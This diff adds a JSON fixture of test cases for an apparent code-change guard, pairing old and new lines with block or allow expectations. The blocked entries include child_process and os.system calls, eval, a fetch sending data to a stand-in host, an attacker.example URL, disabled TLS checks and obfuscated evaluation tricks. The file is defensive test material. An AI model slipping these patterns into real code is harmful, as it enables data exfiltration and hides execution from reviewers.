@@ -1,0 +1,226 @@
+[
+ {
+  "id": "fs-import",
+  "old": "const a = 1;",
+  "new": "const fs = require('fs');",
+  "expect": "block",
+  "tier": "core",
+  "category": "module"
+ },
+ {
+  "id": "child-process",
+  "old": "run();",
+  "new": "const cp = require('child_process'); cp.execSync('id');",
+  "expect": "block",
+  "tier": "core",
+  "category": "exec"
+ },
+ {
+  "id": "new-package",
+  "old": "const a = require('widget');",
+  "new": "const a = require('widget'); const e = require('evil-pkg');",
+  "expect": "block",
+  "tier": "core",
+  "category": "module"
+ },
+ {
+  "id": "esm-new-import",
+  "old": "import a from 'widget';",
+  "new": "import a from 'widget'; import b from 'left-pad';",
+  "expect": "block",
+  "tier": "core",
+  "category": "module"
+ },
+ {
+  "id": "eval",
+  "old": "return x;",
+  "new": "return eval(x);",
+  "expect": "block",
+  "tier": "core",
+  "category": "exec"
+ },
+ {
+  "id": "new-function",
+  "old": "return x;",
+  "new": "return new Function('a','return a')(x);",
+  "expect": "block",
+  "tier": "core",
+  "category": "exec"
+ },
+ {
+  "id": "fetch",
+  "old": "return x;",
+  "new": "fetch('http://x.test/'+x);",
+  "expect": "block",
+  "tier": "core",
+  "category": "network"
+ },
+ {
+  "id": "new-url",
+  "old": "call();",
+  "new": "const u = 'https://attacker.example/collect';",
+  "expect": "block",
+  "tier": "core",
+  "category": "network"
+ },
+ {
+  "id": "process-env",
+  "old": "call();",
+  "new": "const k = process.env.HOME;",
+  "expect": "block",
+  "tier": "core",
+  "category": "secrets"
+ },
+ {
+  "id": "process-exit",
+  "old": "call();",
+  "new": "process.exit(0);",
+  "expect": "block",
+  "tier": "core",
+  "category": "exec"
+ },
+ {
+  "id": "tls-off",
+  "old": "call();",
+  "new": "const o = { rejectUnauthorized: false };",
+  "expect": "block",
+  "tier": "core",
+  "category": "network"
+ },
+ {
+  "id": "string-concat-hide",
+  "old": "call();",
+  "new": "const m = require('ch'+'ild_process');",
+  "expect": "block",
+  "tier": "core",
+  "category": "obfuscation"
+ },
+ {
+  "id": "unicode-escape",
+  "old": "call();",
+  "new": "const x = '\\u0065val'; global['ev'+'al'](x);",
+  "expect": "block",
+  "tier": "core",
+  "category": "obfuscation"
+ },
+ {
+  "id": "global-index",
+  "old": "call();",
+  "new": "globalThis['ev'+'al']('1');",
+  "expect": "block",
+  "tier": "core",
+  "category": "obfuscation"
+ },
+ {
+  "id": "base64-buffer",
+  "old": "call();",
+  "new": "Buffer.from('ZXZpbA==', 'base64');",
+  "expect": "block",
+  "tier": "core",
+  "category": "obfuscation"
+ },
+ {
+  "id": "py-subprocess",
+  "old": "x = 1",
+  "new": "import subprocess\nsubprocess.run(['id'])",
+  "expect": "block",
+  "tier": "core",
+  "category": "exec"
+ },
+ {
+  "id": "py-os-system",
+  "old": "x = 1",
+  "new": "import os\nos.system('id')",
+  "expect": "block",
+  "tier": "core",
+  "category": "exec"
+ },
+ {
+  "id": "py-new-import",
+  "old": "import json",
+  "new": "import json\nimport socket",
+  "expect": "block",
+  "tier": "core",
+  "category": "module"
+ },
+ {
+  "id": "block-comment-hide",
+  "old": "call();",
+  "new": "/* ok */ req/**/uire('fs')",
+  "expect": "block",
+  "tier": "hard",
+  "category": "obfuscation"
+ },
+ {
+  "id": "dynamic-require-var",
+  "old": "call();",
+  "new": "const n = ['c','p'].join(''); require(n);",
+  "expect": "block",
+  "tier": "hard",
+  "category": "obfuscation"
+ },
+ {
+  "id": "rename-import",
+  "old": "const Cache = require('widget');",
+  "new": "const { Cache } = require('widget');",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ },
+ {
+  "id": "await-added",
+  "old": "const v = r.read(k);",
+  "new": "const v = await r.read(k);",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ },
+ {
+  "id": "option-rename",
+  "old": "compress(t, { level: 3 })",
+  "new": "compress(t, { compressionLevel: 3 })",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ },
+ {
+  "id": "esm-named",
+  "old": "import Cache from 'widget';",
+  "new": "import { Cache } from 'widget';",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ },
+ {
+  "id": "same-url-kept",
+  "old": "// see https://example.com/docs\ncall();",
+  "new": "// see https://example.com/docs\ncall(1);",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ },
+ {
+  "id": "async-fn",
+  "old": "function f(k) { return r.read(k); }",
+  "new": "async function f(k) { return await r.read(k); }",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ },
+ {
+  "id": "py-rename-kw",
+  "old": "client.get(url, verify=True)",
+  "new": "client.get(url, follow_redirects=True)",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ },
+ {
+  "id": "identifier-fetchall",
+  "old": "return rows;",
+  "new": "return rows.fetchall();",
+  "expect": "allow",
+  "tier": "core",
+  "category": "benign"
+ }
+]
